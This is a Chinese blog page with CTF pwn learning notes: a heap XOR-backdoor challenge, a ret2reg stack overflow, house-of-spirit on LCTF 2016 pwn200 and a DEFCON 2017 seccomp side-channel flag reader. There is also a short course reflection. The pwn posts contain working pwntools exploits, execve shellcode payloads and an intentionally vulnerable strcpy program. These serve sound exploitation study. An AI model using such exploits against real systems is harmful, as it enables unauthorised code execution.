*((_QWORD *)&amp;ptrs + 2 * size_4));        for ( i = 0; i &lt;= 7; ++i )          *(_BYTE *)(v7 + (__int64)i + 8 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)i)) ^ 0x23;        v2 = *(_WORD *)(v7 + 22LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        v8 = magicffff;        if ( v2 == 12850 )          v8 = *(unsigned __int64 (**)())(v7 + 16LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        for ( j = 0; j &lt;= 7; ++j )          *(_BYTE *)(v7 + (__int64)j + 16 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)j)) ^ 0x32;        return __readfsqword(0x28u) ^ v9;      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ v9;&#125;



​		比较关键的几条语句如下:
1**((_QWORD **)&amp;ptrs + 2 * size_4) = &amp;puts;

​		这一条把堆块数据区开头8字节赋值了puts函数的地址
​		然后从第8字节开始读入剩下的数据
1v7 = read(0, (void *)(*((_QWORD *)&amp;ptrs + 2 * size_4) + 8LL), size - 8);

​		下面这两句刚开始没看懂,一直在想怎么样才能满足这个条件呢,这条语句的意思是,判断输入的数据后面第6字节是否等于8995, 14可以拆成两个来看 8 + 6, 8代表了puts的8字节, 6就是剩下的6字节, 然后判断这个地址的值是否等于8995,8995这样的数还是切换成16进制比较好! 因为在gdb中显示的基本都是16进制,这可能也是自己没判断出来相关关系的一个原因
12v1 = *(_WORD *)(v7 + 14LL + *((_QWORD *)&amp;ptrs + 2 * size_4));if ( v1 == 8995 )       v1 == 0x2323

​		其实看不太懂没关系,完全可以在gdb中调试的时候发现端倪,在那两次奇怪的xor之后,能够看到符合条件的两个值,0x2323和0x3232

​		也就是说可以调整位置让程序符合这个判断条件,符合判断条件有什么用呢?
​		如果不符合条件,v8仍然是后门函数的地址,那么xor后,仍然是一个无效地址,但如果已经xor过一次,通过进入0x2323的执行流,把v8的值设置为xor过一次的地址,那么再次xor后,就恢复原样了!就得到后门函数了
12345 v8 = magicffff;       if ( v1 == 0x2323 )          v8 = *(unsigned __int64 (**)())(v7 + 8LL + *((_QWORD *)&amp;ptrs + 2 * size_4));for ( i = 0; i &lt;= 7; ++i )          *(_BYTE *)(v7 + (__int64)i + 8 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)i)) ^ 0x23;



具体步骤
刚开始两次add, 都添加大小为32的块，



删除0号块



申请40大小的块（32行吗？32不行，32的话，用不了下一个chunk的prev_size字段），输入31个a（不是32是因为后面会补一个0x00），然后后面两个8字节就被xor了，后面两个8字节，一个是size，一个是存放puts函数地址的，这样的话，就把magic xor后的数值存放到了这里， 所以后面的问题是如何解xor，当时也卡在了这里

其实在调试中仔细观察的话（所以不能光空想！） 会发现有0x2323 0x3232，正好可以进入到两个判断条件中，  
后面再进入0x23， 两次xor就回到原先的值了！


再次释放0



再次申请0 40,并填满



show 1 就可以了

奥。。。明白为什么比赛的时候做题没做出来了。。没有看懂关键逻辑（以及想当然的以为xor后的东西看着一连串一样的，以为没啥用，其实地址0x55555当然很多一样的了。。）。。就像之前的那道题一样，都不需要写脚本，看懂逻辑了直接交互就可以了
关键逻辑在add里面

偷一下exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import * from time import sleepimport osimport syselfPath = &#x27;./pwn&#x27;libcPath = &#x27;&#x27;remoteAddr = &#x27;&#x27;remotePort = &#x27;&#x27;context.log_level = &#x27;debug&#x27;context.binary = elfPathcontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]myelf = context.binaryif sys.argv[1] == &#x27;l&#x27;:    sh = process(elfPath)    libc = myelf.libcelse:    if sys.argv[1] == &#x27;d&#x27;:       sh = process(elfPath, env = &#123;&#x27;LD_PRELOAD&#x27;: libcPath&#125;)    else:       sh = remote(remoteAddr,remotePort)       context.log_level = &#x27;info&#x27;    if libcPath:       libc = ELF(libcPath)    else:        libc = myelf.libc    def add(sz, content):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;1&#x27;)    sh.sendlineafter(&#x27;size:\n&#x27;, str(sz))    sh.sendlineafter(&#x27;content:\n&#x27;, content)def show(idx):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;2&#x27;)    sh.sendlineafter(&#x27;id:\n&#x27;, str(idx))def delete(idx):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;3&#x27;)    sh.sendlineafter(&#x27;id:\n&#x27;, str(idx))if __name__ == &#x27;__main__&#x27;:    add(0x28, &#x27;a&#x27; ) # 0    add(0x28, &#x27;b&#x27; ) # 1    delete(0)    gdb.attach(sh)    add(0x28, &#x27;c&#x27; * 0x1f)    delete(0)    add(0x28,&#x27;d&#x27; * 0x1f)    show(1)    sh.interactive()    sh.close()



https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html
https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/
很多题都不错,好好搞一下有空
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/" title="pwn入门-34-rop之ret2reg">pwn入门-34-rop之ret2reg</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-14T14:06:44.000Z" title="发表于 2023-07-14 22:06:44">2023-07-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-16T06:06:27.410Z" title="更新于 2023-09-16 14:06:27">2023-09-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">手法概述​		这一种攻击手法主要利用的是像如 jmp rsp, jmp rax,call rax这种跳转的指令. 这种指令在一些情况下可以对抗ALSR随机化, 因为比如我们写入一段shellcode,但是不知道shellcode的开始地址,不过,如果有一个寄存器,例如rax,指向shellcode的空间,那么栈溢出后,覆盖返回地址为call rax即可返回到shellcode处进行执行.
​		主要参考的这一篇文章,利用的这里面的例子,不过在复现的时候,有些地方和文章里有点小区别
​		https://blog.csdn.net/sinat_35695255/article/details/52031813
漏洞代码ret2reg.c  编译:gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector
打开ALSR echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space
12345678910111213141516#include &lt;stdio.h&gt;    #include &lt;string.h&gt;    void evilfunction(char *input) &#123;        char buffer[512];        strcpy(buffer, input);    &#125;    int main(int argc, char **argv) &#123;        evilfunction(argv[1]);        return 0;    &#125; 



攻击过程寻找溢出长度​		可以通过gdb调试,也可以通过参考文章作者给的办法
1./ret2reg $(perl -e &#x27;printf &quot;A&quot;x524 . &quot;BBBB&quot;&#x27;)  

完之后再查看内核崩溃文件,能看到覆盖了返回地址,EIP被设置为BBBB

寻找gadget1234567891011121314root@vultr:~/ret2reg# objdump  -d ret2reg | grep *%eax    101d:	ff d0                	call   *%eax    110c:	ff d0                	call   *%eax    root@vultr:~/ret2reg# ROPgadget --binary ret2reg --only=&quot;call&quot;Gadgets information============================================================0x000010b6 : call dword ptr [eax + 0x51]0x000010af : call dword ptr [eax - 0x73]0x000011f0 : call dword ptr [edx - 0x77]0x0000101d : call eax0x0000115d : call edxUnique gadgets found: 5



寻找shellcode和寄存器的关系​		在strcpy后,shellcode的存放地址,也在了eax中(存放返回值),因为strcpy函数的返回值是指向最终的目标字符串 dest 的指针，所以如果有jmp eax或者call eax，就可以转移控制流过去

core文件gdb ret2reg core文件 –q 查看内核崩溃文件, 可以看到崩溃时的情况
那么,linux 程序崩溃 如何产生core呢?
ulimit查看,如果为0,就不会产生,需要设置一下,
ulimit -c unlimited 设置为可以产生coredump且大小不受限制,但仅对当前会话?生效,如果想要永久生效,修改&#x2F;etc&#x2F;profile,加入ulimit -c unlimited即可
参考链接: https://www.tinymind.net.cn/articles/e4c54a679a8b15
设置core文件路径:
proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 可以设置格式化的 core 文件保存位置或文件名 
1echo &quot;/core/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern

https://www.ngui.cc/el/1819464.html?action=onClick
exp​		这里的一个重点是要找call eax的地址,
​		echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space（作者echo 2, 说是不随机化加载地址,但是我这边随机化了…回头再了解下
123456pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA     Start        End Perm     Size Offset File0x56555000 0x56558000 r-xp     3000      0 /root/ret2reg/ret2reg0x56558000 0x56559000 r-xp     1000   2000 /root/ret2reg/ret2reg0x56559000 0x5655a000 rwxp     1000   3000 /root/ret2reg/ret2reg



方法一​	0x5655601d
1./ret2reg $(perl -e &#x27;printf &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot; . &quot;A&quot;x499 .&quot;\x1d\x60\x55\x56&quot;&#x27;)

​		随机化程度有多少呢? 是否可以枚举	
​		根据实际情况测试,随机化的大小好像不是很大,可以直接枚举(回头确认下范围)

​			和博客里的那个随机化不一样,博客里说把randomize_va_space设置为2,这里设置为2仍然会随机化,设置为0就都取消了
12345root@vultr:~/ret2reg# echo 0 &gt; /proc/sys/kernel/randomize_va_spaceroot@vultr:~/ret2reg# ./ret2reg $(perl -e &#x27;printf &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot; . &quot;A&quot;x499 .&quot;\x1d\x60\x55\x56&quot;&#x27;)# lscore  exp.py  ret2reg  ret2reg.c# exit



方法二​		这里面的三个payload都可以用,本质上没啥区别. 不加架构也能成功,注意需要在启动时就传递参数的话,用这种方式 p &#x3D; process(argv&#x3D;[“.&#x2F;ret2reg”,payload])
1234567891011from pwn import *#context.arch= &#x27;i386&#x27;context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)shellcode = asm(shellcraft.sh())#payload = shellcode + b&quot;a&quot;*(524-len(shellcode))+p32(0x5655601d)#payload = b&quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;+b&quot;a&quot;*499+p32(0x5655601d)payload = b&quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;+b&quot;a&quot;*499+b&quot;\x1d\x60\x55\x56&quot;p = process(argv=[&quot;./ret2reg&quot;,payload])p.interactive()



参考链接:https://it.cha138.com/jingpin/show-199849.html
问题jmp可以吗? jmp是指什么来.. 
call和jmp的区别


2.关于随机化地址的问题
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/" title="ucas-夏季学期-云存储安全和知识图谱">ucas-夏季学期-云存储安全和知识图谱</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-18T03:20:48.000Z" title="发表于 2023-06-18 11:20:48">2023-06-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-18T14:54:47.669Z" title="更新于 2023-06-18 22:54:47">2023-06-18</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">研究生课程</a></span></div><div class="content">​		夏季学期选课选到了第一周,一周上完,满满的五天课,还是收获了很多的. 首先是这个云计算安全实践(其实是云存储安全实践)做了一个小系统,正好本身打算学c++,这就提前做个小项目了,感觉收获蛮多的. 然后就是知识图谱课程,当初了解知识图谱是导师给我推荐,可以用这个来整理自己的笔记,后来用了用(可能还算不上知识图谱,就是图),确实感觉很不错,因为更符合人的思维习惯我觉得,用图的形式来表达,能够更好地看清事物之间的联系,也有助于建立自己的知识体系!   
​		不过选了知识图谱这个课程…可能是个错误的选择…真要深入了解的话,隔行如隔山,什么自然语言处理,各种机器学习的东西像听天书一样,听的我头大(头疼),确实不太喜欢这个东西, 不过也反思了一下自己,如果真的有必要去学的话,要克制一下自己的喜好,该学的要学.
云存储安全​		老师它们甚至还写了本书,为了这个课程(或许是有了书才有的课程),这本书里应该把整个系统的实现写的差不多了,代码完成了百分之七八十,所需要的是理解原理,看懂代码,然后进行CV(小小修改)
​		书籍: 《云存储安全实践》  陈驰老师团队 (微信读书有的)
​		这个系统主要是实现一个类似云盘功能的东西,然后加入了很多安全的东西,比如三权分立,有账户管理的管理员、有日志管理的管理员、有系统的管理员,然后就是普通用户了. 
​		然后对于核心的用户功能,类似于实现了一个云盘,用户可以上传文件,然后文件是加密传输的,存储到阿里云等公有云上,密钥存储到另外一个云管理平台上,这样就保证了即便数据泄露了,也不会被攻击者轻易得到数据.
​		前端采用QT框架,利用c++进行开发,后端采用java.
​		其实没有设计太复杂的编程,本质还是增删改查,融入了一些安全的理念以及云存储的一点功能.(不过不是说这个系统很简单,这个系统确实能学到很多东西)
​		
​		以及通过这次实验,让我加深了一个印象,编程不是魔法,没有什么特殊的技巧,更重要的是基础, 尤其是在这次编程中体会到了模版函数等各种机制的利用会带来非常大的便利,比如说很多功能类似的函数,这时候就需要模版函数了,很多复杂的功能,也都是最基本的函数,以及循环、顺序、判断的组合.
​		
​		登陆页面:

​		用户管理页面:

​		文件管理页面:

​		搜索功能

知识图谱​		没什么评价…………..听天书……….
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/" title="pwn入门-33-houseofspirit">pwn入门-33-houseofspirit</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-08T12:51:23.000Z" title="发表于 2023-06-08 20:51:23">2023-06-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:26.297Z" title="更新于 2023-06-09 20:28:26">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		这个东西蛮有意思,可以对内存中一块fastbin大小的不可控内存区域进行读写,但它需要满足两个条件
​		1.该区域的前后的内存是可控的
​		2.存在一个可控指针可以作为free函数的参数
how2heap的例子https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c
确实需要画图,画图的话看得很清晰了就

LCTF 2016 pwn200​		看一下有rwx段,可以写shellcode,本来是想打onegadget的,不过这种打法还需要泄露libc的地址
12345678root@VM-24-10-ubuntu:/home/ubuntu/heap/houseofsp# checksec pwn200[*] &#x27;/home/ubuntu/heap/houseofsp/pwn200&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments





1234567891011121314151617181920__int64 sub_400A8E()&#123;  __int64 i; // [rsp+10h] [rbp-40h]  char v2[48]; // [rsp+20h] [rbp-30h] BYREF  puts(&quot;who are u?&quot;);  for ( i = 0LL; i &lt;= 47; ++i )  &#123;    read(0, &amp;v2[i], 1uLL);    if ( v2[i] == 10 )    &#123;      v2[i] = 0;      break;    &#125;  &#125;  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);  puts(&quot;give me your id ~~?&quot;);  sub_4007DF();  return sub_400A29();&#125;



123456789101112131415161718192021222324252627int sub_4007DF()&#123;  char nptr[8]; // [rsp+0h] [rbp-10h] BYREF  int v2; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  v2 = 0;  for ( i = 0; i &lt;= 3; ++i )  &#123;    read(0, &amp;nptr[i], 1uLL);    if ( nptr[i] == 10 )  //换行    &#123;       nptr[i] = 0;  //空字符      break;    &#125;    if ( nptr[i] &gt; 57 || nptr[i] &lt;= 47 ) // 如果不是数字的话,就打印出来(只读取一个了就),如果是的话,跳过    &#123;      printf(&quot;0x%x &quot;, (unsigned int)nptr[i]);      return 0;    &#125;  &#125;  v2 = atoi(nptr);  if ( v2 &gt;= 0 )    return atoi(nptr);  else    return 0;&#125;



​		要先想办法泄露地址,输入回车的会被替换成0(就相当于字符串到最后了,被截断)
​		把前面修改为  0x40 fastbin大小,,然后进行free, 然后malloc获取到ret地址,然后就修改ret进行getshell
泄露地址​		不要遗漏每一个函数和语句!

​		输入48个A泄露rbp
​		
伪造chunk​		这里是输入money那里,可以直接覆盖到ptr指针,把ptr覆盖了,覆盖成当前rbp的地址之前的某个位置,伪造chunk,free,然后再申请拿到这一块内存控制权限,然后就可以修改ret了,但是两个问题,
​		1.不知道libc的地址,知道的话,可以直接onegadget了,所以书中的解法是用了shellcode
​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决

​		可以看一下最终的效果图,很清晰

exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#io = remote(&#x27;0.0.0.0&#x27;, 10001)io = process(&#x27;./pwn200&#x27;)shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)def leak():	global fake_addr	global shellcode_addr	payload = shellcode.rjust(48, b&#x27;A&#x27;)	io.sendafter(&quot;who are u?\n&quot;, payload)	io.recvuntil(payload)	rbp_addr = u64(io.recvn(6).ljust(8, b&#x27;\x00&#x27;))	shellcode_addr = rbp_addr - 0x20 - len(shellcode)	fake_addr = rbp_addr - 0x20 - 0x30 - 0x40		# make fake.size = 0x40	log.info(&quot;shellcode address: 0x%x&quot; % shellcode_addr)	log.info(&quot;fake chunk address: 0x%x&quot; % fake_addr)def house_of_spirit():	io.sendlineafter(&quot;give me your id ~~?\n&quot;, &#x27;65&#x27;)	# next.size = 0x41	fake_chunk  = p64(0) * 5	fake_chunk += p64(0x41)							# fake.size	fake_chunk  = fake_chunk.ljust(0x38, b&#x27;\x00&#x27;)	fake_chunk += p64(fake_addr)					# overwrite pointer	io.sendafter(&quot;give me money~\n&quot;, fake_chunk)	io.sendlineafter(&quot;choice : &quot;, &#x27;2&#x27;)				# free(fake_addr)	io.sendlineafter(&quot;choice : &quot;, &#x27;1&#x27;)				# malloc(fake_addr)	io.sendlineafter(&quot;long?&quot;, &#x27;48&#x27;)	payload = b&quot;A&quot; * 0x18	payload += p64(shellcode_addr) 					# overwrite return address	payload = payload.ljust(48, b&#x27;\x00&#x27;)	io.sendafter(&quot;48\n&quot;, payload)def pwn():	io.sendlineafter(&quot;choice&quot;, &#x27;3&#x27;)	io.interactive()leak()house_of_spirit()pwn()



排错​		自己写的exp一直有问题,有一大片后面的选择\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;EASY HOTEL&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n1. check in\n2. check out\n3. goodbye\nyour choice :的输出
​		捣鼓半天是leak那里出问题了..一个回车引发的血案……….草……… 造成了后面一堆的错乱,为啥gdb里不影响呢? 
​		这里要用send,因为存在offbyone,所以不需要回车,可以正好填满缓冲区,然后把rbp打印出来
12345def leak(): 14     global fake_addr,shellcode_addr 15     payload = shellcode.rjust(48,b&#x27;A&#x27;) 16     p.recvuntil(&quot;who are u?\n&quot;) 17     p.send(payload)

​		感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? 是的,是这样
是的,理论上48个字符后,下一个字符,会放到ebp-0x38,也就是刚才输入的who are u后面的前方(不信可以输入49个a试试)
1234.text:0000000000400B1F                 call    sub_4007DF.text:0000000000400B24                 cdqe.text:0000000000400B26                 mov     [rbp+var_38], rax.text:0000000000400B2A                 mov     eax, 0


​	不正常的,不正常是因为\n被give you id读取了,然后65\n和give your money后面全乱了


​		正常的(伪造这个0x41的位置),释放后再申请,前面18个随便填充,然后就覆盖返回地址了

待整理​	感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? 是的,是这样
程序运行起来了,接入pid调试
,或者能不能直接看内存空间
Gdb attach本地进程进去	
搞一搞pwntools,深入理解下
house_of_spirit 也有一个send
你的exp有问题…不过确实可以找一下其他的学一下
​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决
https://blog.csdn.net/sinat_35360663/article/details/128510319
后面有个总结不错
一个回车惹的祸…
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/" title="pwn入门-32-defcon2017资格赛-mute">pwn入门-32-defcon2017资格赛-mute</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-06T10:20:11.000Z" title="发表于 2023-06-06 18:20:11">2023-06-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-28T14:42:28.731Z" title="更新于 2023-07-28 22:42:28">2023-07-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		侧信道是个很有意思的东西…万物皆可侧信道…各种奇奇怪怪的方法










https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute
​		好多年前的defcon的题了,但现在来看也并不简单,一方面考察了脑洞,要想到侧信道的办法,另一方面要有比较深厚的计算机基础,比如了解系统调用,会写汇编,对汇编比较熟悉才能写出来exp.
程序分析1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  int v5; // [rsp+14h] [rbp-Ch]  void *buf; // [rsp+18h] [rbp-8h]  v5 = 0;  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);  puts(&quot;SILENCE, FOUL DAEMON!&quot;);  v3 = _bss_start;  fflush(_bss_start);  dropSyscalls(v3);  while ( v5 != 4096 )  &#123;    v3 = 0LL;    v5 += read(0, buf, 4096 - v5);  &#125;  ((void (__fastcall *)(FILE *))buf)(v3);  return 0;&#125;



​		读取一段内容到buf,然后执行读取的内容,很明显,要读取一段shellcode,但是禁用了一些系统调用
123456789101112131415161718192021222324root@VM-24-10-ubuntu:/home/ubuntu/side# seccomp-tools dump ./muteSILENCE, FOUL DAEMON! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019 0005: 0x15 0x0c 0x00 0x00000000  if (A == read) goto 0018 0006: 0x15 0x0b 0x00 0x00000002  if (A == open) goto 0018 0007: 0x15 0x0a 0x00 0x00000003  if (A == close) goto 0018 0008: 0x15 0x09 0x00 0x00000004  if (A == stat) goto 0018 0009: 0x15 0x08 0x00 0x00000005  if (A == fstat) goto 0018 0010: 0x15 0x07 0x00 0x00000006  if (A == lstat) goto 0018 0011: 0x15 0x06 0x00 0x00000007  if (A == poll) goto 0018 0012: 0x15 0x05 0x00 0x00000008  if (A == lseek) goto 0018 0013: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0018 0014: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0018 0015: 0x15 0x02 0x00 0x0000000b  if (A == munmap) goto 0018 0016: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0018 0017: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0019 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0019: 0x06 0x00 0x00 0x00000000  return KILL

​		诶 不是有execve吗,不能getshell吗
exp​		思路是有的,但是编写exp就比较头疼,汇编比较渣,总之一步步来,先open read然后读每个字节,然后比较,(pwncollege好好打打基础!)
1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;ERROR&#x27;)  # 这个必须加,不然shellcraft没法正确识别指令集flag = &quot;&quot;for i in range(15): # flag的位数,不知道就可以多写点    c = 0  # 存储字符的ascii码    for j in range(8): # 一个字符8位 循环每一位        p = process(&quot;./mute&quot;)        p.readline()         shellcode = shellcraft.open(&quot;./flag&quot;,constants.O_RDONLY,None) # 打开文件        shellcode += pwnlib.shellcraft.amd64.mov(&quot;r8&quot;,&quot;rax&quot;) # 把句柄给r8        shellcode += pwnlib.shellcraft.amd64.lseek(&quot;r8&quot;,i,0) # lseek 读写文件偏移量,这个就是说,一个字节一个字节读,        shellcode += pwnlib.shellcraft.amd64.read(&quot;r8&quot;,&quot;rsp&quot;,1) # 把内容读取1字节,读到rsp上        shellcode += &#x27;&#x27;&#x27;            movzx eax, BYTE PTR [rsp]  #把rsp指向的地址处的要比较的字符读取到al中,0扩展到eax            movsx edx,al    # 把要比较的字符放到edx中            mov eax,%s   #把变量放到eax中,就是循环变量 j ,以此循环每个位,一共8位            mov ecx,eax  # 把变量放到ecx            sar edx,cl   # 右移 cl位            mov eax,edx            and eax,1            test eax,eax # and运算、测试是1还是0            je .L2 # jz的别名,如果是0,跳转L2        .L3:            jmp .L3        .L2:            leave            ret        &#x27;&#x27;&#x27; % j          # 这个是填充%s变量的        shellcode = asm(shellcode)        p.send(shellcode+b&quot;\0&quot;*(0x1000-len(shellcode)))        try:            p.recv(timeout=1)  # 1,移位然后或,把新的一位设置为1            c = (c&gt;&gt;1) | 128   # 0000 0000     1000 0000  f 0x66 0b1100110        except EOFError:   # 0 , leave ret后EOFError            c = c&gt;&gt;1    sys.stdout.write(chr(c))    flag += chr(c)    sys.stdout.flush()print(flag)



汇编分析1234567891011121314151617181920212223242526272829303132333435363738394041/* open(file=&#x27;flag&#x27;, oflag=0, mode=0) */   /* push b&#x27;flag\x00&#x27; */   push 0x67616c66   mov rdi, rsp   xor edx, edx /* 0 */   xor esi, esi /* 0 */   /* call open() */   push SYS_open /* 2 */   pop rax   syscall   mov r8, rax   # 返回值,句柄,   /* lseek(fd=&#x27;r8&#x27;, offset=0, whence=0)  这是第一次,偏移为0*/   mov rdi, r8   xor edx, edx /* 0 */   xor esi, esi /* 0 */   /* call lseek() */   push SYS_lseek /* 8 */   pop rax   syscall   /* call read(&#x27;r8&#x27;, &#x27;rsp&#x27;, 1) */   xor eax, eax /* SYS_read */   mov rdi, r8   push 1   pop rdx   mov rsi, rsp   syscall  # 系统调用号是0 前面xor即可           movzx    eax, BYTE PTR [rsp]           movsx    edx, al           mov    eax, 0           mov    ecx, eax           sar    edx, cl           mov    eax, edx           and    eax, 1           test    eax, eax           je    .L2       .L3:           jmp    .L3       .L2:           leave           ret



调试调试的话,可以直接pwntools+gdb调,也可以写段汇编自己调试
接收字符分析12345try:    p.recv(timeout=1)  # 收到消息了,是1,移位然后或,把新的一位设置为1    c = (c&gt;&gt;1) | 128   # 0000 0000     1000 0000  f 0x66 0b1100110except EOFError:       # 0     c = c&gt;&gt;1



​		以接收f的过程为例, f是 0b01100110 
12345678910root@vultr:~/side# python3 1.py0b00b100000000b110000000b11000000b1100000b100110000b110011000b1100110f

​		上面是直接print(bin(c))打印的每次的输出结果,其实不是很好看,补全后就明朗了,就是每次接收一个字符都会往后移动一位,然后前面的就是新的一位
0b000000000b100000000b110000000b011000000b001100000b100110000b110011000b01100110
​		刚开始一直不明白是0还是1的时候才会接收到消息,也就是说是,leave;ret;会接收到消息,还是一直jmp会接收到消息,现在看结果是一直jmp会接收到消息,这是为什么呢?
​		嘶,感觉其实不是接收到了消息,而是时间到了后,也没有报错,就继续往下执行了,但如果是0的话,就会exit退出,然后EOFError,1的话接收时间过了,就执行下面代码了.
留的小尾巴了解一下怎么调试汇编吧..直接编写汇编代码调试
还没用时间侧信道来做呢…
